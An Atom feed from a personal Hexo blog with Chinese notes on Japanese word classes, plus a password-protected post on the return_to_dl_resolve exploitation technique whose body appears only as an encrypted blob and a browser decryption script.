<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WinterSun Space</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://winter3un.github.io/"/>
  <updated>2019-06-14T01:42:52.653Z</updated>
  <id>https://winter3un.github.io/</id>
  
  <author>
    <name>WinterSun</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日语词性</title>
    <link href="https://winter3un.github.io/2019/06/13/cixing/"/>
    <id>https://winter3un.github.io/2019/06/13/cixing/</id>
    <published>2019-06-14T01:35:26.000Z</published>
    <updated>2019-06-14T01:42:52.653Z</updated>
    
    <content type="html"><![CDATA[<p><code>2019年6月14日 09:33:19</code>更新</p><a id="more"></a><h2 id="体言"><a href="#体言" class="headerlink" title="体言"></a>体言</h2><h3 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h3><h3 id="代词"><a href="#代词" class="headerlink" title="代词"></a>代词</h3><p>「こそあど」所衍生的指示代词</p><h3 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a>数量词</h3><p><strong>比较本土化及书面化的用法：</strong></p><p>一つ（ひとつ）<br>二つ（ふたつ）<br>三つ（みっつ）<br>四つ（よっつ）<br>五つ（いつつ）<br>六つ（むっつ）<br>七つ（ななつ）<br>八つ（やっつ）<br>九つ（ここのつ）<br>十（とお）</p><p><strong>口语上的用法：</strong></p><p>1个（いっこ）<br>2个（にこ）<br>三个（さんこ）<br>四个（よんこ）<br>五个（ごこ）<br>六个（ろっこ）<br>七个（ななこ）<br>八个（はっこ）<br>九个（きゅうこ）<br>十个（じゅっこ）</p><h2 id="用言"><a href="#用言" class="headerlink" title="用言"></a>用言</h2><h3 id="形容词"><a href="#形容词" class="headerlink" title="形容词"></a>形容词</h3><p>也被叫作一类形容词，原型情况下，通常是词尾是い。</p><h3 id="形容动词"><a href="#形容动词" class="headerlink" title="形容动词"></a>形容动词</h3><p>也被叫作二类形容词，原型情况下，通常没有词尾，在简体形式下要加だ。</p><p>特殊的二类形容词：嫌い</p><h3 id="动词"><a href="#动词" class="headerlink" title="动词"></a>动词</h3><h4 id="一类动词"><a href="#一类动词" class="headerlink" title="一类动词"></a>一类动词</h4><p>以う段假名结尾，并且不是二类及三类动词的，分到一类动词</p><h4 id="二类动词"><a href="#二类动词" class="headerlink" title="二类动词"></a>二类动词</h4><p>以る结尾，并且倒数第二个假名为え段假名。</p><h4 id="三类动词"><a href="#三类动词" class="headerlink" title="三类动词"></a>三类动词</h4><p>1、か变动词</p><p>来る（くる）、变化比较特殊</p><p>2、さ变动词</p><p>する、以及与する结合而成的复合动词（比如：勉强する、旅行する）</p><img src="/2019/06/13/cixing/1.png" alt="1.png" title="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;2019年6月14日 09:33:19&lt;/code&gt;更新&lt;/p&gt;
    
    </summary>
    
    
      <category term="日语" scheme="https://winter3un.github.io/tags/%E6%97%A5%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>通过return_to_dl_resolve技术秒题</title>
    <link href="https://winter3un.github.io/2018/08/19/return-to-dl-resolve/"/>
    <id>https://winter3un.github.io/2018/08/19/return-to-dl-resolve/</id>
    <published>2018-08-20T03:47:22.000Z</published>
    <updated>2018-08-20T03:52:54.348Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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